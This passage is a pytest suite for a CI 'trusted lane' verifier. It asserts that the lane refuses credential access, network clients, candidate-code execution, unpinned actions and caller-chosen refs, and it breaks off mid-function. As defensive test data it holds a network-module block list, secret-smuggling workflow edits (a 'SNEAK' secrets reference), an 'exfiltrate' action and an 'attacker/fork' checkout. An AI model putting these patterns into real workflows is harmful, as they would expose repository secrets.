"""Phase D0 trusted-lane bootstrap — containment tests.

These are deliberately weighted toward NEGATIVE tests. A trusted lane's value
is entirely in what it refuses, and a suite that only exercises happy paths
proves that the code runs, not that the boundary holds. So most of what follows
constructs the bypass and asserts the refusal, including the bypasses that would
be easy to reintroduce by a plausible-looking edit:

* an engine loaded from the candidate checkout;
* a `sys.path` that makes the candidate package importable via its parent;
* a workflow trigger or `ref` input that lets a caller choose the code;
* a no-secret job that can nonetheless reach a secret;
* a response adapter supplied by the reviewed package;
* an operator-record set that authorizes itself.

Two suite-wide rules, both enforced by tests rather than by convention:
no module in `scripts/trustedlane/` may import an HTTP client, and no test here
may make a network call. D0 holds no credential, so there is nothing to spend
and nothing to leak — and that is a property worth proving, not asserting.
"""

from __future__ import annotations

import ast
import hashlib
import inspect
import json
import os
import re
import shutil
import subprocess
import sys
from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))

from trustedlane import (  # noqa: E402
    CANONICAL_REMOTE_URL,
    CANONICAL_REPOSITORY,
    REPOSITORY_NUMERIC_ID,
    actionpolicy,
    adapter,
    candidatefetch,
    closure,
    enginepolicy,
    errors,
    identity,
    livepolicy,
    phases,
    prerequisites,
    workflowfile,
    workflowpolicy,
)

LANE_DIR = ROOT / "scripts" / "trustedlane"
# Real commit SHAs from this repository's history: protected main, the reviewed
# candidate head, and PR #23's frozen head. Public git identities, not
# credentials — hence the allowlist pragmas the secret gate requires for any
# 40-hex literal.
SHA_A = "b08844a0755710035d62830faa84902d9d85d3fe"  # pragma: allowlist secret
SHA_B = "caf5119dc39a9596a73b0d2f4ffbefc6c092890f"  # pragma: allowlist secret
SHA_C = "a9062aa656a5a6f3dbe5991d16ce9c218aad0454"  # pragma: allowlist secret
DIGEST = hashlib.sha256(b"digest").hexdigest()


def _refusal(reason_fragment):
    """Assert a LaneRefusal whose category names the failure we expect."""
    return pytest.raises(errors.LaneRefusal, match=reason_fragment)


# --------------------------------------------------------------------------
# The two suite-wide invariants: no credential, no transport.
# --------------------------------------------------------------------------

#: Anything that could originate a provider call. `socket` is included because
#: an HTTP client is not the only way to reach the network.
NETWORK_MODULES = {
    "httpx", "requests", "urllib", "urllib3", "urllib.request", "http",
    "http.client", "socket", "ssl", "openai", "anthropic", "aiohttp",
    "websockets", "ftplib", "telnetlib", "smtplib", "xmlrpc",
}

#: Environment names a credential would plausibly hide behind.
CREDENTIAL_ENV_MARKERS = ("KEY", "TOKEN", "SECRET", "PASSWORD", "CREDENTIAL")


def _lane_sources():
    return sorted(LANE_DIR.rglob("*.py"))


def test_lane_has_sources():
    """Guards every source-scanning test below against a silent zero-file pass."""
    assert len(_lane_sources()) >= 10


@pytest.mark.parametrize("path", _lane_sources(), ids=lambda p: p.name)
def test_no_lane_module_imports_a_network_client(path):
    tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
    imported = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported.update(alias.name for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module and not node.level:
            imported.add(node.module)
    offending = sorted(
        name for name in imported
        if name in NETWORK_MODULES or name.split(".")[0] in NETWORK_MODULES)
    assert offending == [], f"{path.name} imports {offending}"


@pytest.mark.parametrize("path", _lane_sources(), ids=lambda p: p.name)
def test_no_lane_module_reads_a_credential_from_the_environment(path):
    """`os.environ["..._KEY"]` anywhere in D0 would contradict the phase."""
    tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
    literals = [node.value for node in ast.walk(tree)
                if isinstance(node, ast.Constant) and isinstance(node.value, str)]
    reads_env = any(
        isinstance(node, ast.Attribute) and node.attr in ("environ", "getenv")
        for node in ast.walk(tree))
    if not reads_env:
        return
    suspicious = sorted(
        text for text in literals
        if any(marker in text.upper() for marker in CREDENTIAL_ENV_MARKERS)
        and text.isupper())
    assert suspicious == [], f"{path.name} names {suspicious} near os.environ"


@pytest.mark.parametrize("path", _lane_sources(), ids=lambda p: p.name)
def test_no_lane_module_uses_eval_exec_or_shell(path):
    """Dynamic execution is how inert data stops being inert."""
    tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            name = getattr(node.func, "id", None)
            assert name not in ("eval", "exec", "compile"), f"{path.name}: {name}"
            for keyword in node.keywords:
                if keyword.arg == "shell":
                    assert not (isinstance(keyword.value, ast.Constant)
                                and keyword.value.value is True), path.name


def test_phase_is_d0_and_declares_no_credential():
    assert phases.IMPLEMENTED_PHASE == phases.D0
    capabilities = phases.assert_phase_permitted(phases.D0)
    assert capabilities["reads_credential"] is False
    assert capabilities["calls_provider"] is False
    assert capabilities["emits_trusted_evidence"] is False
    assert capabilities["may_execute_candidate_code"] is False


@pytest.mark.parametrize("phase", [phases.D1, phases.D2])
def test_phases_past_d0_refuse(phase):
    with _refusal("phase_not_deployed"):
        phases.assert_phase_permitted(phase)


def test_unknown_phase_refuses():
    with _refusal("unknown_phase"):
        phases.assert_phase_permitted("D3_WHATEVER")


# --------------------------------------------------------------------------
# Repository, range, ref and environment identity.
# --------------------------------------------------------------------------

def test_repository_numeric_id_accepts_only_the_authorized_repository():
    assert identity.assert_repository_numeric_id(REPOSITORY_NUMERIC_ID) == \
        REPOSITORY_NUMERIC_ID


@pytest.mark.parametrize("observed", [
    REPOSITORY_NUMERIC_ID + 1,           # a fork
    0,
    -REPOSITORY_NUMERIC_ID,
])
def test_repository_numeric_id_mismatch_refuses(observed):
    with _refusal("repository_id_mismatch"):
        identity.assert_repository_numeric_id(observed)


@pytest.mark.parametrize("observed", [
    str(REPOSITORY_NUMERIC_ID),          # the string form is not the id
    True,                                # bool is an int subclass; not an id
    None,
    float(REPOSITORY_NUMERIC_ID),
])
def test_repository_numeric_id_wrong_type_refuses(observed):
    with _refusal("repository_id_not_integer"):
        identity.assert_repository_numeric_id(observed)


def test_range_requires_all_three_endpoints_to_match():
    authorized = {"target_base_sha": SHA_A, "diff_base_sha": SHA_A,
                  "head_sha": SHA_B}
    assert identity.assert_range(target_base_sha=SHA_A, diff_base_sha=SHA_A,
                                 head_sha=SHA_B, authorized=authorized)


@pytest.mark.parametrize("field", ["target_base_sha", "diff_base_sha",
                                   "head_sha"])
def test_range_mismatch_in_any_endpoint_refuses(field):
    authorized = {"target_base_sha": SHA_A, "diff_base_sha": SHA_A,
                  "head_sha": SHA_B}
    observed = dict(authorized)
    observed[field] = SHA_C
    with _refusal("range_mismatch"):
        identity.assert_range(authorized=authorized, **observed)


def test_range_endpoint_absent_from_authorization_refuses():
    with _refusal("range_not_authorized"):
        identity.assert_range(target_base_sha=SHA_A, diff_base_sha=SHA_A,
                              head_sha=SHA_B,
                              authorized={"target_base_sha": SHA_A,
                                          "diff_base_sha": SHA_A})


@pytest.mark.parametrize("value", ["", "abc", SHA_A.upper(), SHA_A[:39],
                                    SHA_A + "0", DIGEST, None, 12345])
def test_malformed_commit_sha_refuses(value):
    with _refusal("commit_sha_malformed"):
        identity.assert_commit_sha(value, field="head_sha")


def test_only_a_protected_ref_may_run_with_a_credential():
    assert identity.assert_protected_ref("refs/heads/main") == "refs/heads/main"


@pytest.mark.parametrize("ref", [
    "refs/heads/claude/bubblegauge-build-spec-fzthju",
    "refs/heads/fix/verifier-trusted-lane-bootstrap",   # this very branch
    "refs/heads/main-2",
    "refs/pull/23/merge",
    "refs/tags/v3.0.0",
    "main",
])
def test_unprotected_ref_refuses(ref):
    with _refusal("ref_not_protected"):
        identity.assert_protected_ref(ref)


def test_protected_environment_accepts_a_protected_declaration():
    record = identity.assert_environment_protected(
        {"name": "trusted-verifier", "protected": True,
         "allowed_refs": ["refs/heads/main"]})
    assert record["protected"] is True


@pytest.mark.parametrize("environment,category", [
    ({"name": "e", "protected": False, "allowed_refs": ["refs/heads/main"]},
     "environment_not_protected"),
    ({"name": "e", "protected": "true", "allowed_refs": ["refs/heads/main"]},
     "environment_not_protected"),
    ({"name": "e", "protected": True, "allowed_refs": []},
     "environment_allows_no_ref"),
    ({"name": "e", "protected": True,
      "allowed_refs": ["refs/heads/main", "refs/heads/feature"]},
     "environment_allows_unprotected_ref"),
    ({"name": "e", "protected": True}, "environment_field_missing"),
    ("trusted-verifier", "environment_not_object"),
])
def test_environment_policy_refusals(environment, category):
    with _refusal(category):
        identity.assert_environment_protected(environment)


def test_signature_check_reports_its_own_scope_honestly():
    """Presence is not verification, and the record must not imply it is."""
    record = identity.assert_signature_present(
        {"signature": "sig", "signer_identity": "operator",
         "signed_digest": DIGEST}, where="evidence")
    assert record["signature_present"] is True
    assert record["signature_verified"] is False


@pytest.mark.parametrize("record,category", [
    ({"signer_identity": "o", "signed_digest": DIGEST},
     "signature_field_missing"),
    ({"signature": "s", "signed_digest": DIGEST}, "signature_field_missing"),
    ({"signature": "s", "signer_identity": "o"}, "signature_field_missing"),
    ({"signature": "", "signer_identity": "o", "signed_digest": DIGEST},
     "signature_field_missing"),
    ({"signature": "s", "signer_identity": "o", "signed_digest": "short"},
     "signed_digest_malformed"),
])
def test_absent_or_malformed_signature_refuses(record, category):
    with _refusal(category):
        identity.assert_signature_present(record, where="evidence")


# --------------------------------------------------------------------------
# The candidate is never the engine. (Negative tests are the whole point.)
# --------------------------------------------------------------------------

@pytest.mark.parametrize("engine_path", [
    "scripts/verifier",
    "scripts/verifier/finalize.py",
    "/tmp/clone/scripts/verifier/executor.py",
    "./scripts/./verifier",
    "work/candidate/scripts/trustedlane",
    "scripts/../scripts/verifier/origin.py",
])
def test_engine_inside_the_candidate_checkout_refuses(engine_path):
    with _refusal("engine_from_candidate_checkout"):
        enginepolicy.assert_not_candidate_checkout(engine_path)


def test_engine_outside_the_candidate_checkout_is_permitted_by_path():
    assert enginepolicy.assert_not_candidate_checkout(
        "/opt/trusted-verifier/engine") == "/opt/trusted-verifier/engine"


@pytest.mark.parametrize("engine_path", ["", None, 0])
def test_missing_engine_path_refuses(engine_path):
    with _refusal("engine_path_missing"):
        enginepolicy.assert_not_candidate_checkout(engine_path)


def test_candidate_path_markers_are_a_ratchet():
    """Shrinking the marker set is a phase decision, not a refactor."""
    assert enginepolicy.CANDIDATE_PATH_MARKERS == (
        os.path.join("scripts", "verifier"),
        os.path.join("candidate", "scripts"),
    )
    assert enginepolicy.CANDIDATE_PACKAGE_NAMES == ("verifier",)


def test_candidate_isolation_holds_for_a_clean_process():
    record = enginepolicy.assert_no_candidate_import(
        modules={"json": object(), "trustedlane": object()},
        search_path=["/opt/trusted-verifier", ""])
    assert record["candidate_isolated"] is True
    assert "package_reachability" in record["checked"]


def test_already_imported_candidate_module_refuses():
    with _refusal("candidate_module_imported"):
        enginepolicy.assert_no_candidate_import(
            modules={"verifier.finalize": object()}, search_path=[])


def test_candidate_package_root_on_sys_path_refuses():
    with _refusal("candidate_path_importable"):
        enginepolicy.assert_no_candidate_import(
            modules={}, search_path=["/tmp/clone/scripts/verifier"])


def test_candidate_package_reachable_through_its_parent_refuses(tmp_path):
    """The realistic bypass: the PARENT directory on sys.path.

    No path entry contains the string `scripts/verifier`, yet `import verifier`
    succeeds. A marker-only check passes this and is worthless."""
    package = tmp_path / "scripts" / "verifier"
    package.mkdir(parents=True)
    (package / "__init__.py").write_text("", encoding="utf-8")
    with _refusal("candidate_package_reachable"):
        enginepolicy.assert_no_candidate_import(
            modules={}, search_path=[str(tmp_path / "scripts")])


def test_candidate_single_module_reachable_refuses(tmp_path):
    (tmp_path / "verifier.py").write_text("", encoding="utf-8")
    with _refusal("candidate_package_reachable"):
        enginepolicy.assert_no_candidate_import(
            modules={}, search_path=[str(tmp_path)])


def test_this_process_is_itself_candidate_isolated():
    """The ambient check the workflow step runs. Protected main has no
    candidate package, so this must pass with no arguments."""
    assert enginepolicy.assert_no_candidate_import()["candidate_isolated"]


def test_engine_identity_shape_is_not_authentication():
    record = {field: "x" for field in enginepolicy.ENGINE_IDENTITY_FIELDS}
    record["distribution"] = enginepolicy.PREFERRED
    result = enginepolicy.validate_engine_identity_shape(record)
    assert result["shape_valid"] is True
    assert result["authenticated"] is False
    assert result["verification_status"] == "SHAPE_ONLY_NOT_AUTHENTICATED"


@pytest.mark.parametrize("field", enginepolicy.ENGINE_IDENTITY_FIELDS)
def test_incomplete_engine_identity_refuses(field):
    record = {f: "x" for f in enginepolicy.ENGINE_IDENTITY_FIELDS}
    record["distribution"] = enginepolicy.PREFERRED
    record[field] = ""
    with _refusal("engine_identity_incomplete"):
        enginepolicy.validate_engine_identity_shape(record)


@pytest.mark.parametrize("distribution", [
    enginepolicy.REFUSED, "SOMETHING_ELSE", None, "",
])
def test_engine_distribution_not_permitted_refuses(distribution):
    record = {f: "x" for f in enginepolicy.ENGINE_IDENTITY_FIELDS}
    record["distribution"] = distribution
    with _refusal("engine_distribution_not_permitted"):
        enginepolicy.validate_engine_identity_shape(record)


def test_engine_approval_always_refuses_in_d0():
    """Even for a complete, well-shaped, preferred-distribution identity.

    Approving an engine needs a key and an operator record held outside the
    branch. A version of this that succeeded would be self-approval."""
    record = {f: "x" for f in enginepolicy.ENGINE_IDENTITY_FIELDS}
    record["distribution"] = enginepolicy.PREFERRED
    record["independent_approval_record"] = "looks-approved"
    with _refusal("engine_not_approved_in_D0"):
        enginepolicy.assert_engine_approved(record)


# --------------------------------------------------------------------------
# Workflow policy, over values and over the deployed file.
# --------------------------------------------------------------------------

@pytest.mark.parametrize("trigger", workflowpolicy.FORBIDDEN_TRIGGERS)
def test_forbidden_trigger_refuses(trigger):
    with _refusal("forbidden_workflow_trigger"):
        workflowpolicy.assert_trigger_permitted(trigger)


@pytest.mark.parametrize("trigger", workflowpolicy.PERMITTED_TRIGGERS)
def test_permitted_trigger_accepted(trigger):
    assert workflowpolicy.assert_trigger_permitted(trigger) == trigger


@pytest.mark.parametrize("trigger", ["pull_request", "release", "", "PUSH"])
def test_unknown_trigger_refuses(trigger):
    with _refusal("unknown_workflow_trigger"):
        workflowpolicy.assert_trigger_permitted(trigger)


@pytest.mark.parametrize("name", workflowpolicy.REF_SELECTING_INPUTS)
def test_ref_selecting_input_refuses(name):
    with _refusal("workflow_input_selects_ref"):
        workflowpolicy.assert_no_ref_selection({name: {"type": "string"}})


def test_non_ref_inputs_accepted():
    record = workflowpolicy.assert_no_ref_selection(
        {"phase": {}, "operator_authorization_sha256": {}})
    assert record["ref_selection"] is False


def test_executed_candidate_checkout_refuses():
    with _refusal("candidate_checkout_executed"):
        workflowpolicy.assert_checkout_is_inert(
            {"executes_checked_out_code": True, "persist_credentials": False})


@pytest.mark.parametrize("step", [
    {"persist_credentials": True},
    {},                       # unset is not False
    {"persist_credentials": None},
])
def test_checkout_that_may_persist_credentials_refuses(step):
    with _refusal("checkout_persists_credentials"):
        workflowpolicy.assert_checkout_is_inert(step)


def test_d0_job_declaring_a_secret_refuses():
    with _refusal("d0_job_declares_secrets"):
        workflowpolicy.assert_secret_not_available(
            {"secrets": {"TRUSTED_VERIFIER_OPENAI_KEY": "${{ secrets.X }}"}})


@pytest.mark.parametrize("env", [
    {"OPENAI_API_KEY": "${{ secrets.X }}"},
    {"GH_TOKEN": "${{ secrets.Y }}"},
    {"MY_SECRET_THING": "z"},
])
def test_d0_job_env_that_looks_like_a_credential_refuses(env):
    with _refusal("d0_job_env_looks_like_a_credential"):
        workflowpolicy.assert_secret_not_available({"env": env})


def test_d0_job_with_no_secret_is_accepted():
    record = workflowpolicy.assert_secret_not_available(
        {"env": {"LANE_PHASE": "D0_NO_SECRET_BOOTSTRAP"}})
    assert record["secrets_declared"] == 0


D0 = workflowfile.D0_FILE
D1 = workflowfile.D1_FILE
D2 = workflowfile.D2_FILE


def _document(name=D0):
    return workflowfile.load_workflow(name, root=str(ROOT))["document"]


def test_all_three_phase_workflows_satisfy_their_own_policy():
    record = workflowfile.validate_all_workflows(root=str(ROOT))
    assert sorted(record["workflows"]) == sorted([D0, D1, D2])
    assert record["undeployable_phases_live"] == 0
    for name, one in record["workflows"].items():
        assert one["literal_credential_assignments"] == 0, name


def test_the_phases_are_three_files_not_one_file_with_a_phase_input():
    """One file with a `phase:` input is one edit from activating D2.

    The split is the containment, so it is asserted rather than assumed: D0 is
    a deployable `.yml`, D1 and D2 are not deployable at all."""
    assert workflowfile.TRUSTED_WORKFLOWS[D0]["deployable_now"] is True
    assert workflowfile.TRUSTED_WORKFLOWS[D1]["deployable_now"] is False
    assert workflowfile.TRUSTED_WORKFLOWS[D2]["deployable_now"] is False
    assert D1.endswith(".yml.template") and D2.endswith(".yml.template")
    # And the D0 file offers no phase selector at all.
    block = _document(D0).get(True) or _document(D0).get("on")
    dispatch = block.get("workflow_dispatch") or {}
    assert not (dispatch or {}).get("inputs"), dispatch


def test_the_d0_workflow_names_no_secret_and_declares_no_environment():
    """The load-bearing difference between D0 and the rest.

    Not "uses no secret" — NAMES none. A workflow with no `secrets.` reference
    has nothing for a later edit to widen."""
    record = workflowfile.validate_workflow_file(D0, root=str(ROOT))
    assert record["secret_references"] == 0
    assert record["environment_jobs"] == []
    raw = (ROOT / workflowfile.WORKFLOW_DIR / D0).read_text(encoding="utf-8")
    for line in raw.splitlines():
        assert "secrets." not in line or line.strip().startswith("#"), line


@pytest.mark.parametrize("name", [D1, D2])
def test_each_credential_phase_is_environment_and_containment_gated(name):
    record = workflowfile.validate_workflow_file(name, root=str(ROOT))
    assert record["credential_bearing_jobs"], name
    assert record["containment_job"] == workflowfile.CONTAINMENT_JOB
    assert record["environment_jobs"] == record["credential_bearing_jobs"]


def test_d1_and_d2_use_separate_environments():
    """Approving counting must not, by environment reuse, approve generating."""
    d1 = _document(D1)["jobs"]["d1-trusted-count"]["environment"]
    d2 = _document(D2)["jobs"]["d2-trusted-generation"]["environment"]
    assert d1 != d2, (d1, d2)


def test_giving_the_d0_workflow_a_secret_reference_reddens():
    document = _document(D0)
    document["jobs"]["d0-containment"]["steps"][0]["env"] = {
        "SNEAK": "${{ secrets.TRUSTED_VERIFIER_OPENAI_KEY }}"}
    with _refusal("phase_must_not_name_a_secret"):
        workflowfile.assert_phase_secret_policy(
            document, name=D0, policy=workflowfile.TRUSTED_WORKFLOWS[D0])


def test_giving_the_d0_workflow_an_environment_reddens():
    document = _document(D0)
    document["jobs"]["d0-containment"]["environment"] = "trusted-verifier"
    with _refusal("phase_must_not_declare_an_environment"):
        workflowfile.assert_phase_secret_policy(
            document, name=D0, policy=workflowfile.TRUSTED_WORKFLOWS[D0])


# ---- action pinning -------------------------------------------------------


def test_every_action_in_every_phase_is_pinned_to_an_approved_commit():
    for name in (D0, D1, D2):
        pins = workflowfile.assert_actions_pinned(_document(name), name=name)
        assert pins["pinned_actions"], name
        for pin in pins["pinned_actions"]:
            assert len(pin["sha"]) == 40
            assert pin["release"].startswith("v")


def test_the_pin_mapping_records_how_it_was_verified_and_what_it_does_not_prove():
    record = actionpolicy.pin_record()
    assert record["pins"]["actions/checkout"] == {
        "11d5960a326750d5838078e36cf38b85af677262": "v4.4.0"}  # pragma: allowlist secret
    assert record["pins"]["actions/setup-python"] == {
        "a26af69be951a213d495a4c3e4e4022e16d87065": "v5.6.0"}  # pragma: allowlist secret
    assert "ls-remote" in record["verification_method"]
    assert "operator act" in record["honest_scope"]


@pytest.mark.parametrize("uses", [
    "actions/checkout@v4",
    "actions/checkout@main",
    "actions/checkout@v4.4.0",
    "actions/setup-python@v5",
])
def test_a_moving_tag_is_refused(uses):
    """A tag is whatever its owner points it at, including after review."""
    with _refusal("action_not_pinned_to_sha"):
        actionpolicy.assert_pinned(uses, where="probe")


def test_an_unknown_action_is_refused_even_when_sha_pinned():
    with _refusal("action_not_in_policy"):
        actionpolicy.assert_pinned("someone/exfiltrate@" + "d" * 40,
                                   where="probe")


def test_a_known_action_at_an_unapproved_sha_is_refused():
    with _refusal("action_sha_not_approved"):
        actionpolicy.assert_pinned("actions/checkout@" + "e" * 40,
                                   where="probe")


@pytest.mark.parametrize("uses", ["./.github/actions/local",
                                  "docker://alpine:latest"])
def test_a_local_or_docker_action_is_refused(uses):
    """A local composite could be added by the same change that references it."""
    with _refusal("action_uses_not_a_pinned_repository"):
        actionpolicy.assert_pinned(uses, where="probe")


def test_an_unpinned_uses_without_an_at_sign_is_refused():
    with _refusal("action_uses_unpinned"):
        actionpolicy.assert_pinned("actions/checkout", where="probe")


def test_the_pin_check_refuses_a_workflow_with_no_actions_at_all():
    """Otherwise the check passes by covering nothing."""
    with _refusal("workflow_uses_no_actions"):
        workflowfile.assert_actions_pinned({"jobs": {"x": {"steps": []}}},
                                           name="probe")


# ---- the candidate source is not a parameter ------------------------------


@pytest.mark.parametrize("field", workflowfile.SOURCE_SELECTING_INPUTS)
def test_an_input_that_selects_the_candidate_source_reddens(field):
    """A SHA is inert data. A repository name is a redirection — and it
    silently invalidates the numeric-id check, which would then be verifying
    whatever server the caller chose."""
    document = _document(D1)
    block = document.get(True) or document.get("on")
    block["workflow_dispatch"]["inputs"][field] = {"type": "string"}
    with _refusal("workflow_input_selects_source"):
        workflowfile.assert_no_source_selection(document, name=D1)


def test_d1_accepts_the_candidate_range_only_as_two_shas():
    document = _document(D1)
    block = document.get(True) or document.get("on")
    inputs = sorted(block["workflow_dispatch"]["inputs"])
    assert inputs == ["candidate_head_sha", "operator_authorization_sha256",
                      "target_base_sha"]
    assert workflowfile.assert_no_source_selection(
        document, name=D1)["source_selection"] is False


def test_a_checkout_of_another_repository_reddens():
    document = _document(D1)
    document["jobs"]["d1-trusted-count"]["steps"][0]["with"]["repository"] = \
        "attacker/fork"
    with _refusal("checkout_selects_repository"):
        workflowfile.assert_no_source_selection(document, name=D1)


@pytest.mark.parametrize("script", [
    "python scripts/verifier/finalize.py",
    "pip install -e .",
    "python -m verifier.plan",
    "bash candidate/build.sh",
])
def test_a_step_that_executes_candidate_content_reddens(script):
    document = _document(D0)
    document["jobs"]["d0-containment"]["steps"].append({"run": script})
    with _refusal("workflow_executes_candidate_content"):
        workflowfile.assert_no_candidate_execution(document, name=D0)


# ---- shared structural rules ----------------------------------------------


def test_yaml_folds_the_on_key_to_true_and_the_loader_handles_it():
    """If this ever changes, `assert_triggers` must not silently pass."""
    document = _document(D0)
    assert ("on" in document) or (True in document)
    assert workflowfile.assert_triggers(document)["triggers"]


@pytest.mark.parametrize("name", [D0, D1, D2])
def test_a_reintroduced_pull_request_target_trigger_reddens(name):
    block = dict(_document(name).get(True) or {})
    block["pull_request_target"] = {"types": ["opened"]}
    with _refusal("forbidden_workflow_trigger"):
        workflowfile.assert_triggers({True: block})


def test_a_reintroduced_ref_input_reddens():
    block = dict(_document(D1).get(True) or {})
    dispatch = dict(block["workflow_dispatch"])
    dispatch["inputs"] = {**dispatch["inputs"], "ref": {"type": "string"}}
    with _refusal("workflow_input_selects_ref"):
        workflowfile.assert_triggers({True: {**block,
                                             "workflow_dispatch": dispatch}})


def test_a_write_permission_reddens():
    document = _document(D0)
    document["permissions"] = {"contents": "write"}
    with _refusal("workflow_permissions_grant_write"):
        workflowfile.assert_permissions_read_only(document)


def test_an_unset_workflow_permissions_block_reddens():
    document = _document(D0)
    document.pop("permissions", None)
    with _refusal("workflow_permissions_unset"):
        workflowfile.assert_permissions_read_only(document)


@pytest.mark.parametrize("name,job", [(D0, "d0-containment"),
                                      (D1, "d1-trusted-count"),
                                      (D2, "d2-trusted-generation")])
def test_a_checkout_that_persists_credentials_reddens(name, job):
    document = _document(name)
    step = document["jobs"][job]["steps"][0]
    step["with"] = {k: v for k, v in step["with"].items()
                    if k != "persist-credentials"}
    with _refusal("checkout_persists_credentials"):
        workflowfile.assert_checkouts_are_safe(document)


@pytest.mark.parametrize("expression", [
    "${{ inputs.candidate_head_sha }}",
    "${{ github.event.pull_request.head.sha }}",
    "${{ github.head_ref }}",
    "${{ needs.d0-containment.outputs.head }}",
])
def test_a_caller_controlled_checkout_ref_reddens(expression):
    """Even the candidate SHA input: it is data for the FETCH, never a ref the
    trusted engine checks itself out at.

    The refusal is now `checkout_ref_is_an_expression` — strictly stronger than
    the prefix list this test was written against, which the review defeated
    with `env.` and `steps.`."""
    document = _document(D1)
    document["jobs"]["d1-trusted-count"]["steps"][0]["with"]["ref"] = expression
    with _refusal("checkout_ref_is_an_expression"):
        workflowfile.assert_checkouts_are_safe(document)


def test_giving_the_containment_job_an_environment_reddens():
    document = _document(D1)
    document["jobs"]["d0-containment"]["environment"] = "trusted-verifier"
    with _refusal("containment_job_has_environment"):
        workflowfile.assert_secret_containment(document)


def test_a_secret_reference_in_the_containment_job_reddens():
    document = _document(D1)
    document["jobs"]["d0-containment"]["steps"][0].setdefault("env", {})
    document["jobs"]["d0-containment"]["steps"][0]["env"]["SNEAK"] = \
        "${{ secrets.TRUSTED_VERIFIER_OPENAI_KEY }}"
    with _refusal("containment_job_references_secret"):
        workflowfile.assert_secret_containment(document)


def test_a_credential_job_without_an_environment_reddens():
    document = _document(D1)
    document["jobs"]["d1-trusted-count"].pop("environment")
    with _refusal("secret_job_not_environment_gated"):
        workflowfile.assert_secret_containment(document)


def test_a_credential_job_not_gated_behind_containment_reddens():
    document = _document(D1)
    document["jobs"]["d1-trusted-count"].pop("needs")
    with _refusal("secret_job_not_gated_behind_containment"):
        workflowfile.assert_secret_containment(document)


def test_a_needs_cycle_reddens_rather_than_recursing_forever():
    document = _document(D1)
    document["jobs"]["d1-trusted-count"]["needs"] = ["d1-trusted-count"]
    with _refusal("workflow_needs_cycle"):
        workflowfile.assert_secret_containment(document)


def test_a_literal_credential_in_the_workflow_reddens():
    raw = (b"jobs:\n  x:\n    steps:\n"
           b"      - env:\n"
           b"          OPENAI_API_KEY: sk-not-a-real-key-000\n")
    with _refusal("workflow_assigns_literal_credential"):
        workflowfile.assert_no_literal_credential(raw)


def test_a_secret_reference_is_not_a_literal_credential():
    raw = (b"jobs:\n  x:\n    steps:\n"
           b"      - env:\n"
           b"          OPENAI_API_KEY: ${{ secrets.TRUSTED_KEY }}\n")
    assert workflowfile.assert_no_literal_credential(raw)[
        "literal_credential_assignments"] == 0


# ---- deployment containment ------------------------------------------------


@pytest.mark.parametrize("name", [D1, D2])
def test_renaming_a_template_into_the_live_directory_reddens(tmp_path, name):
    """The one step that must stay deliberate: `.yml.template` -> `.yml`."""
    source = tmp_path / workflowfile.WORKFLOW_DIR
    source.mkdir(parents=True)
    for each in (D0, D1, D2):
        shutil.copy(ROOT / workflowfile.WORKFLOW_DIR / each, source / each)
    live = tmp_path / ".github" / "workflows"
    live.mkdir(parents=True)
    # Real content, because detection is by the workflow's declared `name:`
    # rather than its filename — a stub named correctly is not the hazard.
    shutil.copy(ROOT / workflowfile.WORKFLOW_DIR / name,
                live / name[:-len(".template")])
    with _refusal("undeployable_phase_is_live"):
        workflowfile.assert_no_template_is_live(root=str(tmp_path))


def test_d0_in_the_live_directory_is_permitted():
    """D0 is the deployment target, so this must NOT be a blanket ban."""
    assert workflowfile.assert_no_template_is_live(
        root=str(ROOT))["undeployable_phases_live"] == 0


def test_d1_and_d2_are_absent_from_the_live_directory_right_now():
    live = ROOT / ".github" / "workflows"
    for name in (D1, D2):
        assert not (live / name[:-len(".template")]).exists()


def test_an_unknown_workflow_name_refuses():
    with _refusal("unknown_trusted_workflow"):
        workflowfile.load_workflow("d3-world-domination.yml", root=str(ROOT))


def test_a_missing_workflow_file_refuses(tmp_path):
    with _refusal("trusted_lane_workflow_missing"):
        workflowfile.load_workflow(D0, root=str(tmp_path))


def test_an_unparseable_workflow_file_refuses(tmp_path):
    target = tmp_path / workflowfile.WORKFLOW_DIR / D0
    target.parent.mkdir(parents=True)
    target.write_text("jobs: [unclosed\n", encoding="utf-8")
    with _refusal("trusted_lane_workflow_unparseable"):
        workflowfile.load_workflow(D0, root=str(tmp_path))


def test_a_non_mapping_workflow_file_refuses(tmp_path):
    target = tmp_path / workflowfile.WORKFLOW_DIR / D0
    target.parent.mkdir(parents=True)
    target.write_text("- just\n- a\n- list\n", encoding="utf-8")
    with _refusal("trusted_lane_workflow_not_mapping"):
        workflowfile.load_workflow(D0, root=str(tmp_path))


def test_every_secrets_occurrence_anywhere_is_a_reference_not_a_value():
    """A whole-file scan of all three, independent of the structural walk."""
    for name in (D0, D1, D2):
        raw = (ROOT / workflowfile.WORKFLOW_DIR / name).read_text(
            encoding="utf-8")
        for line in raw.splitlines():
            if "secrets." in line and not line.strip().startswith("#"):
                assert "${{ secrets." in line and "}}" in line, (name, line)


# --------------------------------------------------------------------------
# Candidate commits as inert data.
# --------------------------------------------------------------------------

@pytest.fixture()
def candidate_origin(tmp_path):
    """A real local git repository to clone. Two commits, one changed file."""
    origin = tmp_path / "origin"
    origin.mkdir()
    env = {**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@e",
           "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@e"}

    def run(*args):
        return subprocess.run(("git", *args), cwd=origin, env=env,
                              capture_output=True, check=True)

    run("init", "-q", "-b", "main")
    (origin / "a.txt").write_text("base\n", encoding="utf-8")
    run("add", "a.txt")
    run("commit", "-qm", "base")
    base = run("rev-parse", "HEAD").stdout.decode().strip()
    (origin / "a.txt").write_text("head\n", encoding="utf-8")
    run("commit", "-qam", "head")
    head = run("rev-parse", "HEAD").stdout.decode().strip()
    return {"path": str(origin), "base": base, "head": head}


def test_git_runs_under_the_hermetic_environment(candidate_origin):
    out = candidatefetch.git(["rev-parse", "HEAD"],
                             cwd=candidate_origin["path"],
                             operation="test-rev-parse")
    assert out.decode().strip() == candidate_origin["head"]


def test_hermetic_environment_disables_repository_driven_execution():
    """Each of these is a way repository content can otherwise run code."""
    env = candidatefetch.HERMETIC_GIT_ENV
